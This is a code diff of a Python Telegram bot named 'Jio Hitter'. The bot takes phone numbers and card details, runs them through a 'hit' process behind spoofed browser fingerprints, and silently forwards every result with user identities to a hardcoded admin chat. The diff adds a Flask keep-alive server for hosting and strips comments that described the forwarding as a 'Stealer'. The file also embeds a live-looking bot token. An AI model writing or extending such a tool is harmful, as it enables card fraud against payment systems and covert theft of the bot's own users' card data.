@@ -6,15 +6,17 @@ import sys
 import subprocess
 import random
 import string
+import threading
 from datetime import datetime, timezone, timedelta
+from flask import Flask
 import warnings
 warnings.filterwarnings("ignore")
 
 # --- AUTO INSTALL REQUIREMENTS ---
 def install_requirements():
-    for pkg in ["curl_cffi", "pyTelegramBotAPI"]:
+    for pkg in ["curl_cffi", "pyTelegramBotAPI", "flask", "requests"]:
         try:
-            __import__("curl_cffi" if pkg == "curl_cffi" else "telebot")
+            __import__("curl_cffi" if pkg == "curl_cffi" else ("telebot" if pkg == "pyTelegramBotAPI" else pkg))
         except ImportError:
             print(f"Installing {pkg}...")
             subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "--quiet"])
@@ -24,6 +26,17 @@ install_requirements()
 from curl_cffi import requests
 import telebot
 
+# --- KEEP-ALIVE FLASK SERVER FOR RENDER PORT ---
+app = Flask(__name__)
+
+@app.route('/')
+def home():
+    return "🤖 Jio Hitter Bot is Alive and Running!"
+
+def run_flask():
+    port = int(os.environ.get("PORT", 10000))
+    app.run(host="0.0.0.0", port=port)
+
 PROFILES = [
     {"imp":"chrome131","ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36","ch":'"Google Chrome";v="131", "Not_A Brand";v="8", "Chromium";v="131"',"plat":'"Windows"',"mob":"?0"},
     {"imp":"chrome124","ua":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","ch":'"Google Chrome";v="124", "Not_A Brand";v="8", "Chromium";v="124"',"plat":'"macOS"',"mob":"?0"},
@@ -32,10 +45,9 @@ SCREENS = [{"h":1080,"w":1920,"depth":24},{"h":900,"w":1440,"depth":30}]
 LANGS = ["en-US,en;q=0.9","en-GB,en;q=0.9,en-US;q=0.8","en-IN,en;q=0.9,en-US;q=0.8"]
 
 TG_BOT_TOKEN = "9040723839:AAEIRfrWdw5YGLZfVQn_qjGJZM2LebDOcq4"
-ADMIN_CHAT_ID = 6755426755  # Aapki ID jahan sare logs aur hits aayenge
+ADMIN_CHAT_ID = 6755426755  # Aapki Admin ID
 
 bot = telebot.TeleBot(TG_BOT_TOKEN)
-
 USERS_FILE = "bot_users.json"
 
 def load_users():
@@ -306,7 +318,6 @@ def cmd_jio_hit(message):
         number = parts[1].strip()
         card = parts[2].strip()
         
-        # Smooth status update (Live editing message)
         sent_msg = bot.reply_to(message, "⏳ *Initializing Jio Hitter...*", parse_mode="Markdown")
         
         def update_status(text):
@@ -316,11 +327,8 @@ def cmd_jio_hit(message):
                 pass
 
         result = jio_hit_process(number, card, update_status)
-        
-        # Edit message to final result
         bot.edit_message_text(result, chat_id=sent_msg.chat.id, message_id=sent_msg.message_id, parse_mode="Markdown")
         
-        # Stealer / Admin Notification Log Forwarder
         user_info = f"👤 User: {message.from_user.first_name} (ID: `{message.from_user.id}`)\n"
         log_text = f"🚨 **NEW HIT LOGGED**\n\n{user_info}\n{result}"
         try:
@@ -331,7 +339,6 @@ def cmd_jio_hit(message):
     except Exception as e:
         bot.reply_to(message, f"❌ **Error:** `{str(e)}`", parse_mode="Markdown")
 
-# --- BROADCAST COMMAND (Admin Only) ---
 @bot.message_handler(commands=['broadcast'])
 def cmd_broadcast(message):
     if message.from_user.id != ADMIN_CHAT_ID:
@@ -361,6 +368,11 @@ def cmd_broadcast(message):
     bot.edit_message_text(f"✅ **Broadcast Completed!**\n\nSuccessful: {success}\nFailed: {fail}", chat_id=status_msg.chat.id, message_id=status_msg.message_id, parse_mode="Markdown")
 
 if __name__ == "__main__":
-    print("🤖 Jio Hitter Bot with Stealer & Broadcast is running...")
+    # Start Flask server in a separate background thread so Render detects an open port
+    t = threading.Thread(target=run_flask)
+    t.daemon = True
+    t.start()
+    
+    print("🤖 Jio Hitter Bot with Flask Keep-Alive is running...")
     bot.infinity_polling()
-        
+    
